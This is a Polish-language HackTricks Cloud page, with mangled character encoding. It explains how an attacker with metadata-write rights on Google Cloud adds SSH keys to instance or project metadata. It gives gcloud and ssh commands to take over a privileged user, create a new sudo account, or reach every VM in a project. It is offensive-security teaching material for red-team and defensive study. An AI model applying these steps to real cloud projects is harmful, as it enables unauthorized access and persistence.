# GCP - Dodawanie niestandardowych metadanych SSH

{% hint style="success" %}
Dowiedz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Modyfikacja metadanych <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modyfikacja metadanych na instancji moÅ¼e prowadziÄ‡ do **znacznych ryzyk bezpieczeÅ„stwa, jeÅ›li atakujÄ…cy uzyska wymagane uprawnienia**.

### **Dodawanie kluczy SSH do niestandardowych metadanych**

Na GCP, **systemy Linux** czÄ™sto wykonujÄ… skrypty z [Python Linux Guest Environment dla Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Istotnym elementem jest tu [demon kont](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), ktÃ³ry jest zaprojektowany do **regularnego sprawdzania** punktu koÅ„cowego metadanych instancji w poszukiwaniu **aktualizacji autoryzowanych kluczy publicznych SSH**.

Dlatego jeÅ›li atakujÄ…cy moÅ¼e modyfikowaÄ‡ niestandardowe metadane, moÅ¼e sprawiÄ‡, Å¼e demon znajdzie nowy klucz publiczny, ktÃ³ry zostanie przetworzony i **zintegrowany z lokalnym systemem**. Klucz zostanie dodany do pliku `~/.ssh/authorized_keys` istniejÄ…cego uÅ¼ytkownika lub potencjalnie utworzy nowego uÅ¼ytkownika z uprawnieniami `sudo`, w zaleÅ¼noÅ›ci od formatu klucza. AtakujÄ…cy bÄ™dzie w stanie skompromitowaÄ‡ hosta.

### **Dodaj klucz SSH do istniejÄ…cego uprzywilejowanego uÅ¼ytkownika**

1. **SprawdÅº IstniejÄ…ce Klucze SSH na Instancji:**
- Wykonaj polecenie opisujÄ…ce instancjÄ™ i jej metadane, aby zlokalizowaÄ‡ istniejÄ…ce klucze SSH. OdpowiedniÄ… sekcjÄ… w wyniku bÄ™dzie `metadata`, a konkretnie klucz `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- ZwrÃ³Ä‡ uwagÄ™ na format kluczy SSH: nazwa uÅ¼ytkownika poprzedza klucz, oddzielone dwukropkiem.

2. **Przygotuj plik tekstowy na metadane klucza SSH:**
- Zapisz szczegÃ³Å‚y nazw uÅ¼ytkownikÃ³w i odpowiadajÄ…cych im kluczy SSH do pliku tekstowego o nazwie `meta.txt`. Jest to istotne dla zachowania istniejÄ…cych kluczy podczas dodawania nowych.

3. **Wygeneruj nowy klucz SSH dla docelowego uÅ¼ytkownika (`alice` w tym przykÅ‚adzie):**
- UÅ¼yj polecenia `ssh-keygen`, aby wygenerowaÄ‡ nowy klucz SSH, upewniajÄ…c siÄ™, Å¼e pole komentarza (`-C`) odpowiada nazwie uÅ¼ytkownika docelowego.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Dodaj nowy klucz publiczny do `meta.txt`, naÅ›ladujÄ…c format znaleziony w metadanych instancji.

4. **Zaktualizuj metadane klucza SSH instancji:**
- Zastosuj zaktualizowane metadane klucza SSH do instancji, uÅ¼ywajÄ…c polecenia `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Zaloguj siÄ™ do instancji, uÅ¼ywajÄ…c nowego klucza SSH:**
- PoÅ‚Ä…cz siÄ™ z instancjÄ… za pomocÄ… SSH, uÅ¼ywajÄ…c nowego klucza, uzyskujÄ…c dostÄ™p do powÅ‚oki w kontekÅ›cie uÅ¼ytkownika docelowego (`alice` w tym przykÅ‚adzie).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **UtwÃ³rz nowego uprzywilejowanego uÅ¼ytkownika i dodaj klucz SSH**

JeÅ›li nie znaleziono interesujÄ…cego uÅ¼ytkownika, moÅ¼na utworzyÄ‡ nowego, ktÃ³ry otrzyma uprawnienia `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Klucze SSH na poziomie projektu <a href="#sshing-around" id="sshing-around"></a>

MoÅ¼liwe jest poszerzenie zasiÄ™gu dostÄ™pu SSH do wielu maszyn wirtualnych (VM) w Å›rodowisku chmurowym poprzez **zastosowanie kluczy SSH na poziomie projektu**. Ten podejÅ›cie umoÅ¼liwia dostÄ™p SSH do dowolnej instancji w ramach projektu, ktÃ³ra nie zablokowaÅ‚a wyraÅºnie projektowych kluczy SSH. Oto zwiÄ™zÅ‚y przewodnik:

1. **Zastosuj klucze SSH na poziomie projektu:**
- UÅ¼yj polecenia `gcloud compute project-info add-metadata`, aby dodaÄ‡ klucze SSH z pliku `meta.txt` do metadanych projektu. Ta czynnoÅ›Ä‡ zapewnia, Å¼e klucze SSH sÄ… rozpoznawane we wszystkich maszynach wirtualnych w projekcie, chyba Å¼e instancja ma wÅ‚Ä…czonÄ… opcjÄ™ "Zablokuj projektowe klucze SSH".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH do instancji przy uÅ¼yciu kluczy na poziomie projektu:**
- DziÄ™ki projektowym kluczom SSH moÅ¼esz Å‚Ä…czyÄ‡ siÄ™ przez SSH z dowolnÄ… instancjÄ… w ramach projektu. Instancje, ktÃ³re nie blokujÄ… projektowych kluczy, zaakceptujÄ… klucz SSH, umoÅ¼liwiajÄ…c dostÄ™p.
- BezpoÅ›redniÄ… metodÄ… SSH do instancji jest uÅ¼ycie polecenia `gcloud compute ssh [INSTANCJA]`. Polecenie to uÅ¼ywa twojej bieÅ¼Ä…cej nazwy uÅ¼ytkownika i kluczy SSH ustawionych na poziomie projektu do prÃ³by dostÄ™pu.


# Referencje
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
